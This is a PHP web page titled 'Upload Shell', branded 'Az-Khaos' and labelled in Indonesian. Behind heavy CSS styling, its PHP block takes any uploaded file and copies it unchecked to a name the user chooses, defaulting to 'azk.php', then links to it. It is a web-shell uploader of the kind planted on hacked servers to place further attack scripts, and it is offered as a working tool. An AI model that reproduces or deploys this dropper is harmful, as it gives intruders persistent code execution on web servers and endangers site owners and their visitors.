<html>
     <head>
<meta name="viewport" content="width=device-width, initial-scale=1">
     <link href='http://fonts.googleapis.com/css?family=Federant' rel='stylesheet' type='text/css'/>
     <link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css" />
 <style type="text/css">
 body {
	   background:black; font-size:11px;
	   font-family: Federant;
    color: white;  }
 a {
     color: dodgerblue;
     font-family: Federant;
      }
 a:hover {
     border-bottom:1px solid aqua;
      }
 #menu a {
 	 font-family: Federant;
    	padding:4px 15px;
    	margin:0;
    	background:darkred;
    	color:white;
    	text-decoration:none;
    	letter-spacing:2px;
    	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
       #menu a:hover {
    	padding:4px 15px;
    	margin:0;
    	 font-family: Federant;
    	background: grey;
    	color:white;
    	text-decoration:none;
    	letter-spacing:2px;
    	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
  textarea {
  	   width:600px;
  	   height:200px;
  	   background: black;
  	   border:1px solid darkred;
  	   color: white;
  	   font-family: Federant;
  	   }
  input[type=text] , input[type=file] , select {   
       background:black;
       color:white;border: 1px solid darkred; 
       padding:6px 6px 6px 6px;
       font-family: Federant;
        }
  input[type=submit] {
       background:#b70505;
       color:white;border: 1px solid #000; 
       padding:6px 6px 6px 6px;
       font-family: Federant;
       }
  .subbtn:hover {
  	   background:#c0bfbf;
  	   color:#000000;
  	   font-family: Federant;
  	   }

td, th { font-size: 12pt; text-align: left; vertical-align: top; color: dodgerblue; }
h1           { font-size: 16pt; text-align: center; }
h1 a         { color: #000000 !important; text-decoration: none; }
p            { text-align: center; font-size: 9pt; }
p a          { color: #666666 !important; }
table        {  margin: 0 auto; border-collapse: collapse; border: 1px solid #ffffff; min-width: 400px; }
th, td       { padding: 5px 10px; }
th           { background: black; color: #ffffff; }
td a         { color: dodgerblue !important; text-decoration: none; }
th img       { position: relative; top: -3px; left: 2px; }
td           { border-bottom: 1px solid #cccccc; background: black; }
tr.odd td    { background: black; }

#lol a {
    	padding:4px 15px;
    	margin:0;
    	background:darkgreen;
    	color:white;
    	text-decoration:none;
    	letter-spacing:2px;
    	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
	  
</style>

<title>Upload Shell</title>
<br />
        <center> <font color="darkred" face="iceland" size="10">Az-Khaos<br>Upload Shell</font>
		 <br />
		 <br />
		 <br />
<img src="http://burosaofis.com/44/TtT.png" width="300" height="300"/>
		 <form action="" method="post" enctype="multipart/form-data">
		  File :	<input type="file" name="file" />
		   	<br /> 
			<br /> 
		  Nama Baru :	<input type="text" name="ufile" value="azk.php" /> 	
		  <br /> 
		  <br /> 
		  <input name="upload" type="submit" value="Upload" /> 
		  </form> 
		  
		  <?php if (isset($_REQUEST['ufile'])) { $ufile = $_POST ['ufile' ] ; } if (isset($_REQUEST['upload'])) { if ($_POST ['upload' ]){ if (@copy ($_FILES ['file' ]['tmp_name' ], $ufile )) { 
		  echo "<b><font color='green'><a href='$ufile'>$ufile</a> = File Sukses Di Upload !!!</font></b>" ; 
		  } else { 
		  echo "<b><font color='darkred'><a href='$ufile'>$ufile</a> = File Gagal Di Upload !!!</font></b>" ; 
		  } } }
	?></center>